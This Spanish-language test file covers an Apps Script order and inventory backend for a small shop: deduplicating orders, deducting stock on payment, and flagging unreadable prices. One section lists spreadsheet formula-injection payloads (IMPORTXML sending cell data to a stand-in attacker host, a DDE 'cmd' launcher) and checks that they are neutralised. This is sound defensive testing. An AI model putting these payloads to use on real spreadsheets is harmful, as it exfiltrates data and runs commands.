// Pruebas del Apps Script sobre el emulador compartido (gas.js), que carga
// apps-script.gs TAL CUAL. Nada de imitaciones escritas a mano.
const crear = require('./gas.js').crear;
const g = crear('./as.js');
const api = g.api;
const H = n => g.hojas.get(n);          // el objeto hoja
const D = n => g.filas(n);              // su matriz de datos
const cache = g.cache;
const j = r => JSON.parse(r._texto);

const instalar = api.instalar, doGet = api.doGet, doPost = api.doPost;
const alEditar = api.alEditar, aplicarInventario = api.aplicarInventario;
const recalcularResumen = api.recalcularResumen, celdaSegura = api.celdaSegura;
const validarRegistro = api.validarRegistro, onOpen = api.onOpen;
const actualizarTodo = api.actualizarTodo;
const esVenta = api.esVenta, estadoDe = api.estadoDe, migrarEstados = api.migrarEstados;
const menuDeLaHoja = api.menuDeLaHoja;

const T = []; const ok = (n, c, d) => T.push((c ? '  OK  ' : ' FALLA') + ' | ' + n + (d ? '  -> ' + d : ''));
const stock = id => { const f = D('Catálogo').find(r => r[0] === id); return f && f[5]; };
const pedidoJSON = (codigo, items) => JSON.stringify({
  pedido: codigo, ref: 'R-TEST', ciudad: 'Bogotá', cupon: '', total: 99999,
  items: items.map(i => ({ id: i[0], nombre: 'x', cantidad: i[1], precio: 1000 }))
});
const post = carga => doPost({ postData: { contents: carga } });
const registrar = (codigo, items, envio) => doGet({ parameter: {
  a: 'registrar', pedido: codigo, ciudad: 'Bogotá', cupon: '',
  envio: envio || 'medellin',
  items: items.map(i => i[0] + ':' + i[1]).join(',') } });
const validar = (codigo, items, cupon, envio) => doGet({ parameter: {
  a: 'validar', sellar: '1', pedido: codigo, cupon: cupon || '',
  envio: envio === undefined ? 'medellin' : envio, sub: '1',
  items: items.map(i => i[0] + ':' + i[1]).join(',') } });
const filasDe = h => D(h).length - 1;

instalar();
ok('instalar() crea el disparador de edición',
   g.triggers.map(t => t.getHandlerFunction()).indexOf('alEditar') !== -1,
   g.triggers.map(t => t.getHandlerFunction()).join(', '));
ok('Pedidos tiene la columna Inventario',
   D('Pedidos')[0][12] === 'Inventario', D('Pedidos')[0].join('|'));
ok('Stock inicial de chonto = 24', stock('chonto') === 24, String(stock('chonto')));

// ---- 1. El mismo pedido enviado tres veces solo entra una ----
registrar('ABC12', [['chonto', 3], ['salsa', 1]]);
registrar('ABC12', [['chonto', 3], ['salsa', 1]]);
registrar('ABC12', [['chonto', 3], ['salsa', 1]]);
let lineas = filasDe('Pedidos');
ok('LA HOJA PEDIDOS SE LLENA (registro por GET)', lineas > 0, lineas + ' líneas');
ok('Tres envíos del mismo código = 2 líneas (no 6)', lineas === 2, lineas + ' líneas');

// ---- 1b. Registrar deja acta. Antes no: un pedido que se enviaba sin pasar
//      por el sello quedaba en Pedidos y en Validaciones NO existía. El acta es
//      la prueba de cuánto valía el pedido cuando salió; sin fila, no hay prueba.
const actaDe = codigo => D('Validaciones').slice(1).filter(f => f[1] === codigo);
ok('REGISTRAR DEJA ACTA, aunque nadie haya pedido sello antes',
   actaDe('ABC12').length === 1, actaDe('ABC12').length + ' filas para ABC12');
ok('  ...y el total del acta es el mismo que cobró Pedidos',
   actaDe('ABC12')[0][8] === D('Pedidos').slice(1).filter(f => f[1] === 'ABC12')[0][11],
   'acta ' + actaDe('ABC12')[0][8] + ' vs Pedidos ' +
   D('Pedidos').slice(1).filter(f => f[1] === 'ABC12')[0][11]);
ok('  ...y tres envíos del mismo código siguen dejando UNA sola acta',
   actaDe('ABC12').length === 1);

// ---- 1c. Validaciones: una fila por pedido, aunque el carrito cambie ----
const actasAntes = filasDe('Validaciones');
validar('QQQ11', [['chonto', 1]]);
validar('QQQ11', [['chonto', 2]]);
validar('QQQ11', [['chonto', 3]], 'ORGANICO10');
validar('QQQ11', [['chonto', 3]], 'ORGANICO10');
ok('Cuatro validaciones del mismo pedido = 1 fila',
   filasDe('Validaciones') === actasAntes + 1,
   filasDe('Validaciones') + ' filas, eran ' + actasAntes);
ok('  ...y la fila guarda el ÚLTIMO estado (3 unidades)',
   /chonto x3/.test(String(actaDe('QQQ11')[0][9])), String(actaDe('QQQ11')[0][9]));
ok('  ...con el número del pedido como referencia',
   actaDe('QQQ11').length === 1 && actaDe('QQQ11')[0][1] === 'QQQ11');
validar('WWW22', [['salsa', 1]]);
ok('Otro pedido sí abre su propia fila', filasDe('Validaciones') === actasAntes + 2,
   filasDe('Validaciones') + ' filas');

/* EL CONGELAMIENTO, EN LOS DOS SENTIDOS. La protección tiene que dejar entrar a
   quien registra —su validación es la autorizada— y seguir cerrada para
   cualquier ?a=validar de fuera sobre un pedido ya enviado. Antes cerraba
   también al primero: el sello sale con 400 ms de espera y el registro sale al
   instante, así que el sello bueno llegaba tarde y el acta se quedaba con la
   zona de envío anterior. Mensaje y Pedidos decían una cosa, el acta otra. */
{
  validar('FRZ77', [['chonto', 1]], '', 'finca');
  const conFinca = actaDe('FRZ77')[0][7];
  registrar('FRZ77', [['chonto', 1]], 'medellin');
  const trasRegistrar = actaDe('FRZ77')[0][7];
  validar('FRZ77', [['chonto', 1]], '', 'finca');
  const trasSelloTardio = actaDe('FRZ77')[0][7];

  ok('EL ACTA LA ESCRIBE QUIEN REGISTRA, no un sello que llega tarde',
     conFinca === 0 && trasRegistrar === 9000,
     'antes ' + conFinca + ', después de registrar ' + trasRegistrar);
  ok('  ...y el acta cuadra con lo que cobró Pedidos',
     actaDe('FRZ77')[0][8] === D('Pedidos').slice(1).filter(f => f[1] === 'FRZ77')[0][11]);
  ok('  ...y después de enviado, un sello de fuera YA NO la reescribe',
     trasSelloTardio === 9000, String(trasSelloTardio));
}

/* EL ACTA GUARDA LOS AVISOS. Sin esto la fila no distingue «eligió recoger en
   finca» de «la hoja no reconoció el envío y avisó»: las dos dejan el envío en
   0. Es la diferencia entre un acta y un recibo. */
{
  registrar('AVS01', [['chonto', 1]], 'ZONA-QUE-NO-EXISTE');
  const acta = actaDe('AVS01')[0];
  ok('EL ACTA GUARDA LOS AVISOS que el maestro le dio al comprador',
     /no está disponible/.test(String(acta[10])), String(acta[10]));
  ok('  ...sin cortarlos a la mitad',
     String(acta[10]).length > 60 && /WhatsApp/.test(String(acta[10])),
     String(acta[10]).length + ' caracteres');
  ok('  ...y el envío que no se reconoce queda en 0, pero explicado',
     acta[7] === 0 && String(acta[10]).length > 0);
}

// ---- 2. Más vendidos está vacío hasta que confirmes ----
recalcularResumen();
ok('Más vendidos vacío mientras esté "Por confirmar"',
   (D('Más vendidos').length - 1) === 0);

// ---- 3. Confirmar mueve el inventario y llena el resumen ----
D('Pedidos')[1][3] = 'Confirmado';
D('Pedidos')[2][3] = 'Confirmado';
alEditar({ range: { getSheet: () => H('Pedidos'), getColumn: () => 4, getNumColumns: () => 1 } });
ok('Confirmar descuenta el stock (24 - 3 = 21)', stock('chonto') === 21, String(stock('chonto')));
ok('  ...y también el del otro producto (9 - 1 = 8)', stock('salsa') === 8, String(stock('salsa')));
ok('  ...marcando la línea como Descontado', D('Pedidos')[1][12] === 'Descontado');
ok('  ...y limpia la caché para que la tienda lo vea ya', !cache['catalogo']);
ok('Más vendidos ya tiene datos', (D('Más vendidos').length - 1) === 2,
   (D('Más vendidos').length - 1) + ' filas');

// ---- 4. Volver a disparar no descuenta dos veces ----
alEditar({ range: { getSheet: () => H('Pedidos'), getColumn: () => 4, getNumColumns: () => 1 } });
aplicarInventario(); aplicarInventario();
ok('Ejecutarlo de nuevo NO vuelve a descontar', stock('chonto') === 21, String(stock('chonto')));

// ---- 5. Anular devuelve el stock ----
D('Pedidos')[1][3] = 'Anulado';
alEditar({ range: { getSheet: () => H('Pedidos'), getColumn: () => 4, getNumColumns: () => 1 } });
ok('Anular devuelve el stock (21 + 3 = 24)', stock('chonto') === 24, String(stock('chonto')));
ok('  ...y marca la línea como Devuelto', D('Pedidos')[1][12] === 'Devuelto');
ok('  ...sin tocar la línea que sigue confirmada', stock('salsa') === 8, String(stock('salsa')));

// ---- 6. Volver a confirmar descuenta otra vez ----
D('Pedidos')[1][3] = 'Confirmado';
alEditar({ range: { getSheet: () => H('Pedidos'), getColumn: () => 4, getNumColumns: () => 1 } });
ok('Confirmar de nuevo vuelve a descontar', stock('chonto') === 21, String(stock('chonto')));

// ---- 7. Editar otra columna no dispara nada ----
const antes = stock('chonto');
alEditar({ range: { getSheet: () => H('Pedidos'), getColumn: () => 5, getNumColumns: () => 1 } });
ok('Editar la Ciudad no toca el inventario', stock('chonto') === antes);

// ---- 8. Un pedido distinto sí entra ----
/* Se cuenta contra lo que había, no contra un número fijo: las baterías de
   arriba registran pedidos propios y una cifra escrita a mano aquí se rompe
   cada vez que se agrega un caso. Patrón 2. */
const lineasAntesDeXYZ = D('Pedidos').length - 1;
registrar('XYZ99', [['chonto', 2]]);
ok('Un código nuevo sí se registra', (D('Pedidos').length - 1) === lineasAntesDeXYZ + 1,
   (D('Pedidos').length - 1) + ' líneas');

// ---- 8b. La validación se congela cuando el pedido ya se envió ----
/* La foto se toma DESPUÉS de registrar, no antes: registrar escribe el acta con
   su propia revalidación —la autorizada— y ese es el estado que queda
   congelado. Antes se tomaba antes, y no se notaba porque registrar no tocaba
   el acta; eso era justamente el fallo: el acta podía quedarse con un sello
   anterior al que de verdad se envió. */
validar('FRZ01', [['chonto', 2]]);
registrar('FRZ01', [['chonto', 2]]);                      // el cliente envía el pedido
const antesCongelar = JSON.stringify(D('Validaciones').find(f => f[1] === 'FRZ01'));
validar('FRZ01', [['chonto', 99]]);                       // alguien intenta pisar la fila
const despuesCongelar = JSON.stringify(D('Validaciones').find(f => f[1] === 'FRZ01'));
ok('Una validación de pedido YA ENVIADO no se puede reescribir',
   antesCongelar === despuesCongelar,
   'antes: ' + (antesCongelar||'').slice(0,60));
ok('  ...y antes de enviarlo sí se actualiza (como debe)', (() => {
     validar('UPD02', [['chonto', 1]]);
     const a = String(D('Validaciones').find(f => f[1] === 'UPD02')[9]);
     validar('UPD02', [['chonto', 5]]);
     const b = String(D('Validaciones').find(f => f[1] === 'UPD02')[9]);
     return a !== b && b.includes('chonto x5');
   })());

// ---- 8c. Un envío que la hoja no conoce se avisa ----
const rEnvioRaro = JSON.parse(doGet({ parameter: { a:'validar', items:'chonto:1',
  envio:'sabana', cupon:'', sub:'8900' } })._texto);
ok('Un envío desconocido se avisa, no se cobra cero en silencio',
   (rEnvioRaro.avisos || []).some(a => /ya no está disponible/.test(a)),
   JSON.stringify(rEnvioRaro.avisos));

// ---- 9. El menú de la hoja ----
ok('El maestro expone el menú y sus acciones',
   typeof menuDeLaHoja === 'function' && typeof actualizarTodo === 'function' &&
   menuDeLaHoja().length > 0, menuDeLaHoja ? menuDeLaHoja().length + ' opciones' : 'no existe');
ok('  ...y cada opción del orden tiene su acción, y al revés',
   api.menuCuadra().ok, JSON.stringify(api.menuCuadra()));

// ---- 10. Inyección de fórmulas de Sheets (sigue cerrada) ----
[
  '=IMPORTXML("https://atacante.com/?f="&A2,"//x")',
  '+HYPERLINK("https://atacante.com","clic")',
  '-2+3=cmd|\'/C calc\'!A0',
  '@SUM(A1:A9)',
  '\t=1+1',
  '\r\n=IMPORTDATA("https://atacante.com")'
].forEach(a => {
  const r = celdaSegura(a);
  ok('Neutraliza ' + JSON.stringify(a.slice(0, 30)), /^'/.test(r) || !/^[=+\-@]/.test(r), JSON.stringify(r));
});
ok('Texto normal intacto', celdaSegura('Bogotá D.C.') === 'Bogotá D.C.');
ok('Recorta a 60 caracteres', celdaSegura('x'.repeat(500)).length === 60);

// ---- 11. Validación del POST ----
ok('Rechaza no-objeto', validarRegistro(null) === null);
ok('Rechaza sin items', validarRegistro({ items: [] }) === null);
ok('Rechaza 31 items', validarRegistro({ items: Array(31).fill({ id: 'chonto', cantidad: 1, precio: 1 }) }) === null);
ok('Descarta id que no esté en el catálogo',
   validarRegistro({ items: [{ id: 'HACKEADO', cantidad: 1 }, { id: 'chonto', cantidad: 2 }] }).items.length === 1);
ok('Elimina duplicados',
   validarRegistro({ items: [{ id: 'chonto', cantidad: 1 }, { id: 'chonto', cantidad: 9 }] }).items.length === 1);
const topes = validarRegistro({ items: [{ id: 'chonto', cantidad: 999999, precio: 9e9 }], total: 9e9, ciudad: 'x'.repeat(300) });
ok('Topa cantidad a 200', topes.items[0].cantidad === 200, String(topes.items[0].cantidad));
ok('Topa total a 5.000.000', topes.total === 5000000);
/* Un pedido nace en «Nuevo» y lo pone el maestro, no quien manda el POST. Si
   lo decidiera el comprador, mandar `estado: Pagado` descontaría inventario sin
   que nadie hubiera pagado nada. */
ok('El Estado NO lo decide quien envía',
   validarRegistro({ estado: 'Pagado', items: [{ id: 'chonto', cantidad: 1 }] }).estado === 'Nuevo',
   validarRegistro({ estado: 'Pagado', items: [{ id: 'chonto', cantidad: 1 }] }).estado);
ok('  ...y el que pone no descuenta inventario por sí solo',
   esVenta('Nuevo') === false && esVenta('Pagado') === true,
   'el stock se mueve al pagar, no al llegar el pedido');
ok('Ciudad con fórmula queda como texto',
   validarRegistro({ ciudad: '=IMPORTXML("http://x","//y")', items: [{ id: 'chonto', cantidad: 1 }] }).ciudad[0] === "'");


/* ============================================================================
   UNA CIFRA QUE NO SE PUEDE LEER NO VALE CERO.
   ----------------------------------------------------------------------------
   Todas las cifras del comerciante se leían con `Number(f[i]) || 0`, y eso
   convierte «no se pudo leer» en «es gratis». Escribir $9.000 en una celda es
   lo más natural del mundo en una hoja de cálculo. Las cuatro consecuencias
   empujaban contra el comerciante y ninguna fallaba.

   La prueba no es Number(): Number('9.000') no es NaN, es 9. Es el TIPO: una
   celda numérica vuelve como número. Y cada caso se resuelve hacia el lado
   seguro — no vender, no cobrar de menos, no aplicar el cupón — y gritando.
   ============================================================================ */
{
  const sucia = crear('./as.js');
  sucia.api.instalar();
  const puerta = o => JSON.parse(sucia.api.doGet({
    parameter: Object.assign({ t: sucia.token }, o) })._texto);

  sucia.hojas.get('Catálogo').getRange(2, 5, 1, 1).setValue('$8.900');   // precio como texto
  sucia.hojas.get('Envíos').getRange(3, 3, 1, 1).setValue('9,000');      // envío como texto
  sucia.hojas.get('Cupones').getRange(2, 4, 1, 1).setValue('50.000');    // mínimo como texto

  const r = puerta({ a: 'validar', items: 'chonto:1,cherry:2', envio: 'medellin', sub: '1' });
  const dice = (r.avisos || []).join(' | ');

  ok('UN PRECIO ILEGIBLE no deja el producto gratis: lo saca del catálogo',
     r.items.map(i => i.id).indexOf('chonto') === -1 &&
     r.items.map(i => i.id).indexOf('cherry') !== -1,
     r.items.map(i => i.id).join(', '));
  ok('UN ENVÍO ILEGIBLE no se cobra en cero callando',
     r.envio === 0 && /no se pudo leer/.test(dice), dice);
  ok('  ...y el aviso nombra la celda exacta, no «hubo un problema»',
     (r.ilegibles || []).some(x => /Catálogo E2/.test(x)) &&
     (r.ilegibles || []).some(x => /Envíos C3/.test(x)),
     JSON.stringify(r.ilegibles));
  ok('  ...y queda una fila en Errores para el comerciante',
     sucia.filas('Errores').slice(1).some(f => /no se pudieron leer/.test(String(f[1]))),
     JSON.stringify(sucia.filas('Errores').slice(1).map(f => f[1])));

  const cup = puerta({ a: 'validar', items: 'cherry:2', envio: 'finca',
                       cupon: 'ORGANICO10', sub: '1' });
  ok('UN CUPÓN CON UN DATO ILEGIBLE no se aplica',
     !cup.cupon.ok && /no pudimos leer/.test(String(cup.cupon.texto)),
     String(cup.cupon.texto));
  ok('  ...que es lo contrario de lo que hacía: mínimo 0 lo aplicaba a todo',
     cup.descuento === 0, String(cup.descuento));

  /* Vacío NO es ilegible: una celda en blanco es una decisión, y vale 0. */
  const limpia = crear('./as.js');
  limpia.api.instalar();
  limpia.hojas.get('Envíos').getRange(2, 3, 1, 1).setValue('');
  const v = JSON.parse(limpia.api.doGet({ parameter: {
    a: 'validar', t: limpia.token, items: 'chonto:1', envio: 'finca', sub: '1' } })._texto);
  ok('UNA CELDA VACÍA sigue valiendo cero, sin ruido',
     v.envio === 0 && (v.ilegibles || []).length === 0,
     JSON.stringify(v.avisos));
}

/* EL ENVÍO VACÍO ERA EL ÚNICO CASO QUE PASABA CALLADO. El aviso estaba detrás
   de `if (idEnvio)`, así que avisaba cuando el id existía pero no se reconocía
   —el caso leve— y no cuando no llegaba ninguno —el caso peor—. */
{
  const g2 = crear('./as.js'); g2.api.instalar();
  const q = o => JSON.parse(g2.api.doGet({
    parameter: Object.assign({ t: g2.token }, o) })._texto);

  const vacio = q({ a: 'validar', items: 'chonto:1', envio: '', sub: '1' });
  ok('UN ENVÍO VACÍO cuesta 0 pero YA NO calla',
     vacio.envio === 0 && (vacio.avisos || []).some(a => /zona de envío/.test(a)),
     JSON.stringify(vacio.avisos));

  const mayus = q({ a: 'validar', items: 'chonto:1', envio: 'MEDELLIN', sub: '1' });
  ok('UN ID EN MAYÚSCULAS ya no rompe el envío del cliente',
     mayus.envio === 9000, String(mayus.envio));
  ok('  ...pero el comerciante se entera, que es quien puede arreglarlo',
     g2.filas('Errores').slice(1).some(f => /mayúsculas/.test(String(f[1]))),
     JSON.stringify(g2.filas('Errores').slice(1).map(f => f[1])));
}

/* ═══ EL CICLO DE VIDA DEL PEDIDO ═══
   Todo lo de arriba sigue escrito con el vocabulario VIEJO —Por confirmar,
   Confirmado, Anulado— y sigue en verde. Eso no es pereza: es la prueba de que
   la convivencia funciona. Una hoja montada hace un mes no se entera de nada.

   Aquí se prueba el vocabulario nuevo, y sobre todo la regla que lo justifica:
   el inventario se descuenta AL PAGAR, y solo ahí. */
{
  const { crear, configurar } = require('./gas.js');
  const nueva = () => {
    const x = crear('./as.js'); x.api.instalar(); configurar(x);
    const hp = x.hojas.get('Pedidos');
    hp.appendRow([new Date(), 'P1', 'V-P1', 'Nuevo', 'Medellín', '',
                  'Tomate chonto', 'chonto', 5, 8900, 44500, 44500, '']);
    return x;
  };
  const stockDe = (x, id) => (x.filas('Catálogo').find(r => r[0] === id) || [])[5];
  const poner = (x, e) => { x.hojas.get('Pedidos').getRange(2, 4).setValue(e);
                            x.api.aplicarInventario(); };

  /* LA REGLA, RECORRIDA ENTERA. Cada estado con lo que le pasa al stock. */
  const inicial = stockDe(nueva(), 'chonto');
  const recorrido = [
    ['Nuevo',             inicial,     'un carrito abierto en WhatsApp no es una venta'],
    ['Pendiente de pago', inicial,     'esperar el pago tampoco reserva stock'],
    ['Pagado',            inicial - 5, 'AQUÍ, y solo aquí'],
    ['Despachado',        inicial - 5, 'viene después de pagado: sigue vendido'],
    ['Entregado',         inicial - 5, 'lo mismo'],
    ['Cancelado',         inicial,     'devuelve lo que se había descontado']
  ];
  recorrido.forEach(([estado, esperado, porque]) => {
    const x = nueva();
    poner(x, estado);
    ok('«' + estado + '» deja el stock en ' + esperado + ' — ' + porque,
       stockDe(x, 'chonto') === esperado,
       'quedó en ' + stockDe(x, 'chonto'));
  });

  /* Y el recorrido de verdad, en una sola hoja y en orden: despachar un pedido
     no puede devolverle el stock a mitad de camino. */
  {
    const x = nueva();
    const visto = [];
    ['Nuevo', 'Pendiente de pago', 'Pagado', 'Despachado', 'Entregado']
      .forEach(e => { poner(x, e); visto.push(stockDe(x, 'chonto')); });
    ok('EL RECORRIDO COMPLETO descuenta UNA vez y no la deshace',
       visto.join(',') === [inicial, inicial, inicial - 5, inicial - 5, inicial - 5].join(','),
       visto.join(' → '));
  }

  /* CONVIVENCIA, dicha por su nombre: cada viejo vale exactamente lo que su
     reemplazo, y se comprueba contra la tabla, no contra una lista a mano. */
  {
    const x = nueva();
    const pares = x.api.ESTADOS ? [] : null;   // la tabla no se exporta: se deduce
    [['Por confirmar', 'Nuevo'], ['Confirmado', 'Pagado'], ['Anulado', 'Cancelado']]
      .forEach(([viejo, nuevo]) => {
        ok('«' + viejo + '» sigue valiendo lo mismo que «' + nuevo + '»',
           esVenta(viejo) === esVenta(nuevo) &&
           (estadoDe(viejo) || {}).id === (estadoDe(nuevo) || {}).id,
           (estadoDe(viejo) || {}).id);
      });
    ok('  ...y el id en minúsculas también, que es como lo escribe el plan',
       esVenta('pagado') && esVenta('pendiente_pago') === false,
       'nuevo · pendiente_pago · pagado · despachado · entregado · cancelado');
    ok('  ...sin importar tildes, mayúsculas ni espacios de más',
       esVenta('PAGADO') && esVenta('  pagádo  ') && esVenta('Pendiente De Pago') === false,
       'una celda escrita a mano trae de todo');
    /* Lo que NO hace es adivinar por trozos. Buscar «confirmado» dentro del
       texto —que es lo que hacía antes— daba por vendido «Confirmado el pago»
       y también «pendiente de confirmado». */
    ok('  ...pero no adivina por trozos de palabra',
       !esVenta('pago') && !esVenta('pagados dos') && !esVenta('ya pagado'),
       'parecerse a un estado no es serlo');
  }

  /* LO QUE NO SE RECONOCE NO ES «NO VENDIDO». Antes cualquier cosa que no
     dijera «confirmado» devolvía el stock: escribir mal la celda de una venta
     ya pagada resucitaba inventario vendido, en silencio. */
  {
    const x = nueva();
    poner(x, 'Pagado');
    const vendido = stockDe(x, 'chonto');
    poner(x, 'Pagdo');                      // errata
    ok('UNA ERRATA EN EL ESTADO no devuelve stock que ya se vendió',
       stockDe(x, 'chonto') === vendido,
       'quedarse quieto es reversible; resucitar inventario vendido, no');
    ok('  ...y el diagnóstico la saca por su fila y con lo que dice',
       (() => { const t = x.api.diagnostico().texto;
                return /Pedidos D2/.test(t) && /Pagdo/.test(t); })(),
       (x.api.diagnostico().texto.match(/ *Pedidos D2[^\n]*/) || [''])[0].trim());
    ok('  ...diciendo cuáles son los válidos',
       /Nuevo · Pendiente de pago · Pagado/.test(x.api.diagnostico().texto));
    /* Una celda VACÍA no es una errata: es una fila a medio escribir. */
    poner(x, '');
    ok('  ...pero una celda vacía no se denuncia como errata',
       !/Pedidos D2/.test(x.api.diagnostico().texto),
       'a medio escribir no es lo mismo que mal escrito');
  }

  /* LA MIGRACIÓN. No es urgente —el backend acepta los dos— pero es lo que
     permite que el desplegable ofrezca solo los nuevos. */
  {
    const x = crear('./as.js'); x.api.instalar(); configurar(x);
    const hp = x.hojas.get('Pedidos');
    [['Por confirmar'], ['Confirmado'], ['Anulado'], ['Pagado'], ['vaya usted a saber']]
      .forEach((e, i) => hp.appendRow([new Date(), 'M' + i, 'V', e[0], 'Cali', '',
                                       'x', 'chonto', 1, 100, 100, 100, '']));
    const cambios = x.api.migrarEstados();
    const col = x.filas('Pedidos').slice(1).map(f => String(f[3]));
    ok('MIGRAR reescribe los tres viejos y nada más', cambios === 3,
       cambios + ' celdas · ' + col.join(' | '));
    ok('  ...dejando el vocabulario nuevo', col.slice(0, 3).join(',') === 'Nuevo,Pagado,Cancelado',
       col.slice(0, 3).join(','));
    ok('  ...sin tocar lo que ya estaba al día', col[3] === 'Pagado');
    ok('  ...ni inventarse nada con lo que no entiende', col[4] === 'vaya usted a saber',
       'una migración que "arregla" lo que no entiende es lo peor que puede hacer');
    ok('  ...y correrla otra vez no cambia nada', x.api.migrarEstados() === 0);
  }

  /* El desplegable de la hoja ofrece los seis, y sale de la MISMA tabla. */
  {
    const x = nueva();
    x.api.presentarHojas();
    const fuente = require('fs').readFileSync('./as.js', 'utf8');
    ok('EL DESPLEGABLE de la hoja sale de la tabla, no de una lista aparte',
       /var ESTADOS_PEDIDO = ESTADOS\.map/.test(fuente),
       'escrita dos veces, una se queda atrás');
    ok('  ...y su ayuda dice la regla: descuenta al PAGAR',
       /PAGADO descuenta el inventario, y solo Pagado/.test(fuente));
  }
}

/* ═══ LOS PEDIDOS QUE LLEGAN TARDE ═══
   El número del pedido lo pone la página, el mensaje de WhatsApp sale siempre,
   y el registro se intenta aparte. Si el maestro no contesta y se agotan los
   reintentos, el comprador se va con su código y en la hoja NO HAY FILA: el
   comercio ve el chat y no ve el pedido.

   La página lo guarda en el navegador del comprador y lo reenvía la próxima vez
   que la tienda abra. Aquí se prueba el lado del maestro: que el reenvío entre
   igual, que no duplique, y sobre todo QUE QUEDE CONTADO — que llegue no borra
   que estuvo perdido. */
{
  const { crear, configurar } = require('./gas.js');
  const x = crear('./as.js'); x.api.instalar(); configurar(x);
  const reg = (codigo, tarde) => JSON.parse(x.api.doGet({ parameter: {
    a: 'registrar', pedido: codigo, ciudad: 'Cali', cupon: '', envio: 'medellin',
    items: 'chonto:1', sub: '8900', tarde: tarde } })._texto);

  ok('UN REGISTRO NORMAL no cuenta como rescate',
     reg('N0001').ok && x.api.rescates().n === 0, JSON.stringify(x.api.rescates()));

  const r = reg('T0001', '7');
  ok('UN PEDIDO REENVIADO entra igual que cualquier otro', r.ok === true,
     JSON.stringify(r));
  ok('  ...y queda contado, porque estuvo perdido un rato',
     x.api.rescates().n === 1 && x.api.rescates().peor === 7,
     JSON.stringify(x.api.rescates()));

  reg('T0002', '2900');
  ok('  ...y se guarda EL PEOR, que es lo que distingue una caída de un tropiezo',
     x.api.rescates().n === 2 && x.api.rescates().peor === 2900,
     'dos días perdido no es lo mismo que tres minutos');

  reg('T0002', '5');
  ok('  ...reenviar dos veces el MISMO pedido no lo cuenta dos veces',
     x.api.rescates().n === 2, JSON.stringify(x.api.rescates()));
  ok('  ...ni baja el peor por un reenvío más rápido', x.api.rescates().peor === 2900);

  ok('  ...y `tarde` con basura no ensucia el contador',
     (() => { const y = crear('./as.js'); y.api.instalar(); configurar(y);
              JSON.parse(y.api.doGet({ parameter: { a: 'registrar', pedido: 'B0001',
                ciudad: 'Cali', cupon: '', envio: 'medellin', items: 'chonto:1',
                sub: '1', tarde: 'sandía' } })._texto);
              return y.api.rescates().n === 0; })(),
     'lo que no es un número de minutos no es un rescate');

  ok('EL DIAGNÓSTICO lo dice, con el peor tiempo en palabras',
     /Pedidos que llegaron TARDE: 2/.test(x.api.diagnostico().texto) &&
     /2 días/.test(x.api.diagnostico().texto),
     (x.api.diagnostico().texto.match(/[^\n]*llegaron TARDE[^\n]*/) || [''])[0]);
  ok('  ...y explica qué significa, no solo el número',
     /salieron por WhatsApp y no llegaron a la hoja/.test(x.api.diagnostico().texto));
  ok('  ...distinguiendo una caída larga de un tropiezo de red',
     /estuvo caída un buen rato/.test(x.api.diagnostico().texto),
     'con 2 días de peor, no puede decir "son normales"');

  /* Y con rescates cortos dice lo contrario, o la frase no distingue nada. */
  {
    const y = crear('./as.js'); y.api.instalar(); configurar(y);
    JSON.parse(y.api.doGet({ parameter: { a: 'registrar', pedido: 'C0001',
      ciudad: 'Cali', cupon: '', envio: 'medellin', items: 'chonto:1',
      sub: '1', tarde: '3' } })._texto);
    ok('  ...y con minutos sueltos dice que son normales',
       /son normales/.test(y.api.diagnostico().texto) &&
       !/estuvo caída/.test(y.api.diagnostico().texto),
       'una frase que dijera lo mismo en los dos casos no serviría');
  }

  ok('EL PANEL lo recibe, para ver si es UNA tienda o son TODAS',
     (() => { const p = JSON.parse(x.api.doGet(
                { parameter: { a: 'panel', t: x.api.token() } })._texto);
              return p.rescates && p.rescates.n === 2 && p.rescates.peor === 2900; })(),
     'un comercio ve el suyo y no sabe si es normal');
}

console.log(T.join('\n'));
console.log('\nResultado: ' + T.filter(x => x.startsWith('  OK')).length + '/' + T.length);
